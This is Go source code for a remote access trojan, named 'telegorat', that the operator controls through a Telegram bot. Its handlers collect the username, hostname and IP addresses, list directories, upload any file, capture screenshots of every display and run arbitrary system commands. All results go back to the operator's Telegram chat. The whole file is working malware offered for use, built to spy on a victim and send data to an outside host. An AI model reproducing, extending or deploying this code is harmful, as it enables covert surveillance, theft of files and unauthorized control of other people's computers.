package main

import (
	"fmt"
	"image/png"
	"log"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"telegorat/helpers"
	"time"

	"github.com/PaulSonOfLars/gotgbot/v2"
	"github.com/PaulSonOfLars/gotgbot/v2/ext"
	"github.com/PaulSonOfLars/gotgbot/v2/ext/handlers"

	"github.com/kbinani/screenshot"
)

var chatId int64

func main() {

	token := os.Getenv("BOT_TOKEN")

	//Get authorized controller's chatId
	chatId, err := strconv.ParseInt(os.Getenv("CHAT_ID"), 10, 64)
	if err != nil {
		panic("Failed to convert chatId to int64: " + err.Error())
	}

	//Create new bot using the bot API token
	b, err := gotgbot.NewBot(token, &gotgbot.BotOpts{
		RequestOpts: &gotgbot.RequestOpts{
			Timeout: gotgbot.DefaultTimeout * 3,
			APIURL:  gotgbot.DefaultAPIURL,
		},
	})
	if err != nil {
		panic("Failed to create new bot: " + err.Error())
	}

	//Send message when initiating connection
	_, err = b.SendMessage(chatId, "just connected", &gotgbot.SendMessageOpts{})
	if err != nil {
		panic("Failed to send initiate message: " + err.Error())
	}

	//Create updater and dispatcher
	updater := ext.NewUpdater(&ext.UpdaterOpts{
		Dispatcher: ext.NewDispatcher(&ext.DispatcherOpts{
			//If an error is returned by a handler, log it and continue going.
			Error: func(b *gotgbot.Bot, ctx *ext.Context, err error) ext.DispatcherAction {
				log.Println("An error occurred while handling update:", err.Error())
				return ext.DispatcherActionNoop
			},
			MaxRoutines: ext.DefaultMaxRoutines,
		}),
	})

	dispatcher := updater.Dispatcher

	//List available commands
	dispatcher.AddHandler(handlers.NewCommand("help", getHelp))
	//Get the bot ID
	dispatcher.AddHandler(handlers.NewCommand("ping", pingPong))
	//Get basic host info
	dispatcher.AddHandler(handlers.NewCommand("systeminfo", systemInfo))
	//Get public IP address
	dispatcher.AddHandler(handlers.NewCommand("ip", getIPs))
	//List files/directories
	dispatcher.AddHandler(handlers.NewCommand("list", listFiles))
	//Read file
	dispatcher.AddHandler(handlers.NewCommand("file", readFile))
	//Take screenshot
	dispatcher.AddHandler(handlers.NewCommand("screenshot", takeScreenshot))
	//Execute system command
	dispatcher.AddHandler(handlers.NewCommand("command", executeCommand))

	//Start polling for updates
	err = updater.StartPolling(b, &ext.PollingOpts{
		DropPendingUpdates: true,
		GetUpdatesOpts: &gotgbot.GetUpdatesOpts{
			Timeout: 9,
			RequestOpts: &gotgbot.RequestOpts{
				Timeout: time.Second * 10,
			},
		},
	})
	if err != nil {
		panic("Failed to start polling: " + err.Error())
	}
	log.Printf("%s has been started...\n", b.User.Username)

	//Idle, to keep updates coming in, and avoid bot stopping.
	updater.Idle()

}

func auth(authorizedChatId int64, effectiveChatId int64) bool {

	//Check if the message received is sent from the authorized controller
	if authorizedChatId == effectiveChatId {
		return true
	} else {
		return false
	}
}

func getHelp(b *gotgbot.Bot, ctx *ext.Context) error {

	//Authentication
	if !(auth(chatId, ctx.EffectiveChat.Id)) {
		return fmt.Errorf("Unauthorized user: %s (%s %s)", ctx.EffectiveChat.Username, ctx.EffectiveChat.FirstName, ctx.EffectiveChat.LastName)
	}

	//Array contains the available commands
	commands := []string{"/ping", "/systeminfo", "/ip", "/list <dir>", "/file <file>", "/screenshot", "/command <system_command>"}

	//Reply with list of available commands
	_, err := b.SendMessage(chatId, strings.Join([]string(commands), "\n"), &gotgbot.SendMessageOpts{})
	if err != nil {
		return fmt.Errorf("Failed to send message: %w", err)
	}

	return nil
}

func pingPong(b *gotgbot.Bot, ctx *ext.Context) error {

	//Reply to ping command with pong
	_, err := b.SendMessage(ctx.EffectiveChat.Id, "pong", &gotgbot.SendMessageOpts{})
	if err != nil {
		return fmt.Errorf("Failed to send start message: %w", err)
	}
	return nil
}

func systemInfo(b *gotgbot.Bot, ctx *ext.Context) error {

	//Authentication
	if !(auth(chatId, ctx.EffectiveChat.Id)) {
		return fmt.Errorf("Unauthorized user: %s (%s %s)", ctx.EffectiveChat.Username, ctx.EffectiveChat.FirstName, ctx.EffectiveChat.LastName)
	}

	user, err := user.Current()
	if err != nil {
		return fmt.Errorf("Failed to get user: %w", err)
	}

	hostname, err := os.Hostname()
	if err != nil {
		return fmt.Errorf("Failed to get hostname: %w", err)
	}

	operatingSystem := runtime.GOOS

	architecture := runtime.GOARCH

	//Reply to ping command with pong
	_, err = b.SendMessage(chatId, fmt.Sprintf("Username: %s\nHostname: %s\nOS : %s\nArch: %s", user.Username, hostname, operatingSystem, architecture), &gotgbot.SendMessageOpts{
		ParseMode: "html",
		//ReplyToMessageId: ctx.EffectiveMessage.MessageId
	})
	if err != nil {
		return fmt.Errorf("Failed to send start message: %w", err)
	}
	return nil
}

func listFiles(b *gotgbot.Bot, ctx *ext.Context) error {

	//Authentication
	if !(auth(chatId, ctx.EffectiveChat.Id)) {
		return fmt.Errorf("Unauthorized user: %s (%s %s)", ctx.EffectiveChat.Username, ctx.EffectiveChat.FirstName, ctx.EffectiveChat.LastName)
	}

	//Read the effective message text (e.g. /list C:\Users\)
	messageText := ctx.EffectiveMessage.Text

	//Extract the filename from the message (e.g. C:\Users\)
	dirName, err := helpers.ExtractArgument(messageText)
	if err != nil {
		//If no argument provided send intructions
		_, err2 := b.SendMessage(chatId, "Usage: <b>/list</b> &lt;dir_path&gt;", &gotgbot.SendMessageOpts{
			ParseMode: "html",
		})
		if err2 != nil {
			return fmt.Errorf("Failed to send instructions: %w", err2)
		}

		return fmt.Errorf("Failed to parse command: %w", err)
	}

	//Read the named directory
	files, err := os.ReadDir(dirName)
	if err != nil {
		return fmt.Errorf("Failed to read directory: %w", err)
	}

	var result strings.Builder

	for _, file := range files {
		file_info := fmt.Sprintf("%-5c\t%s", file.Type().String()[0], file.Name())
		result.WriteString(file_info)
		result.WriteString("\n")
	}

	//If no argument provided send intructions
	_, err = b.SendMessage(chatId, result.String(), &gotgbot.SendMessageOpts{})
	if err != nil {
		return fmt.Errorf("Failed to send message: %w", err)
	}

	return nil
}

func readFile(b *gotgbot.Bot, ctx *ext.Context) error {

	//Authentication
	if !(auth(chatId, ctx.EffectiveChat.Id)) {
		return fmt.Errorf("Unauthorized user: %s (%s %s)", ctx.EffectiveChat.Username, ctx.EffectiveChat.FirstName, ctx.EffectiveChat.LastName)
	}

	//Read the effective message text (e.g. /file C:\test.txt)
	messageText := ctx.EffectiveMessage.Text

	//Extract the filename from the message (e.g. C:\test.txt)
	fileName, err := helpers.ExtractArgument(messageText)
	if err != nil {
		//If no argument provided send intructions
		_, err2 := b.SendMessage(chatId, "Usage: <b>/file</b> &lt;filen_path&gt;", &gotgbot.SendMessageOpts{
			ParseMode: "html",
		})
		if err2 != nil {
			return fmt.Errorf("Failed to send instructions: %w", err2)
		}

		return fmt.Errorf("Failed to parse command: %w", err)
	}

	file, err := os.Open(fileName)
	if err != nil {
		return fmt.Errorf("Failed to open file: %w", err)
	}

	//Send file to telegram server
	_, err = b.SendDocument(chatId, file, &gotgbot.SendDocumentOpts{
		Caption: fileName,
	})
	if err != nil {
		return fmt.Errorf("Failed to send file: %w", err)
	}

	return nil
}

func takeScreenshot(b *gotgbot.Bot, ctx *ext.Context) error {

	//Authentication
	if !(auth(chatId, ctx.EffectiveChat.Id)) {
		return fmt.Errorf("Unauthorized user: %s (%s %s)", ctx.EffectiveChat.Username, ctx.EffectiveChat.FirstName, ctx.EffectiveChat.LastName)
	}

	//Number of active displays
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		//Display boundaries
		bounds := screenshot.GetDisplayBounds(i)

		//Capture screenshot into image data
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			return fmt.Errorf("Failed to capture screenshot: %w", err)
		}

		//Specify the image name
		fileName := filepath.Join(os.TempDir(), fmt.Sprintf("%d_%dx%d.png", i, bounds.Dx(), bounds.Dy()))

		//Temporarily creating a file to save the image
		file, _ := os.Create(fileName)
		if err != nil {
			return fmt.Errorf("Failed to create temporary file: %w", err)
		}

		//Encode image data to PNG format and write to output file
		png.Encode(file, img)

		fmt.Printf("Display #%d : %v \"%s\"\n", i, bounds, fileName)

		file.Close()

		//Read the image file
		image, err := os.Open(fileName)
		if err != nil {
			return fmt.Errorf("Failed to open screenshot: %w", err)
		}

		//Send image to telegram server
		_, err = b.SendPhoto(chatId, image, &gotgbot.SendPhotoOpts{
			Caption: time.Now().Format("2006-01-02 15:04:05"),
		})
		if err != nil {
			return fmt.Errorf("Failed to send screenshot: %w", err)
		}

		image.Close()

		//Delete temporary file
		os.Remove(fileName)

	}

	return nil
}

func getIPs(b *gotgbot.Bot, ctx *ext.Context) error {

	//Authentication
	if !(auth(chatId, ctx.EffectiveChat.Id)) {
		return fmt.Errorf("Unauthorized user: %s (%s %s)", ctx.EffectiveChat.Username, ctx.EffectiveChat.FirstName, ctx.EffectiveChat.LastName)
	}

	//Get public IP
	publicIP, err := helpers.GetPublicIP()
	if err != nil {
		return fmt.Errorf("Failed to retrieve public IP address: %w", err)
	}

	//Get local IP
	localIP, err := helpers.GetLocalIP()
	if err != nil {
		return fmt.Errorf("Failed to retrieve local IP address: %w", err)
	}

	//Send IPs to telegram server
	_, err = b.SendMessage(chatId, fmt.Sprintf("Public IP: <b>%s</b>\nLocal IP: <b>%s</b>", publicIP, localIP), &gotgbot.SendMessageOpts{
		ParseMode: "html",
	})
	if err != nil {
		return fmt.Errorf("Failed to send IP addresses: %w", err)
	}

	return nil
}

func executeCommand(b *gotgbot.Bot, ctx *ext.Context) error {

	//Authentication
	if !(auth(chatId, ctx.EffectiveChat.Id)) {
		return fmt.Errorf("Unauthorized user: %s (%s %s)", ctx.EffectiveChat.Username, ctx.EffectiveChat.FirstName, ctx.EffectiveChat.LastName)
	}

	//Read the effective message text (e.g. /commmand whoami)
	messageText := ctx.EffectiveMessage.Text

	//Extract the filename from the message (e.g. whoami)
	cmd, err := helpers.ExtractArgument(messageText)
	if err != nil {

		//If no argument provided send intructions
		_, err = b.SendMessage(chatId, "<i>Usage:</i> /command &lt;system_command&gt;", &gotgbot.SendMessageOpts{
			ParseMode: "html",
		})
		if err != nil {
			return fmt.Errorf("Failed to send instructions: %w", err)
		}

		return fmt.Errorf("Failed to parse command: %w", err)
	}

	//Execute the system command
	output, err := helpers.ExecuteSystemCommand(cmd)
	if err != nil {
		//If an error occured during the commad execution send it to Telegram server
		_, err2 := b.SendMessage(chatId, err.Error(), &gotgbot.SendMessageOpts{})
		if err2 != nil {
			return fmt.Errorf("Failed to send command execution error: %w", err2)
		}

		return fmt.Errorf("Failed to execute the command: %w", err)
	}

	//Send the output to Telegram server
	_, err = b.SendMessage(chatId, string(output), &gotgbot.SendMessageOpts{})
	if err != nil {
		return fmt.Errorf("Failed to send command output: %w", err)
	}

	return nil
}
